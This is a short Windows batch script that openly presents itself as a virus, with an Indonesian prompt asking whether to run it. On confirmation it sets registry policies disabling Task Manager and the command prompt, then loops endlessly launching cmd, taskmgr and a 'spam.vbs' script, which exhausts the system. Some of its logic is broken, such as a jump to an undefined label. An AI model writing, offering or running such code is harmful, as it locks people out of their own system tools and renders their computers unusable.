@echo off
cls
cd item
start W.txt
:1
echo APAKAH KAMU INGIN MENJALANKAN VIRUS INI?
set /p input= y-n 
if /i %input%==y goto next
if /i %input%==yes goto next
if /i %input%==n goto 3
if /i %input%==no goto 3
pause

:next
echo Y OR N
if /i %input%==y goto yes
if /i %input%==yes goto yes
if /i %input%==A goto distructive
if /i %input%==n goto 3
if /i %input%==no goto 3
pause

:Yes
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
goto run

:Run
start cmd
start taskmgr
start spam.vbs
goto Run

:3
set /p input= Prees enter to continue
exit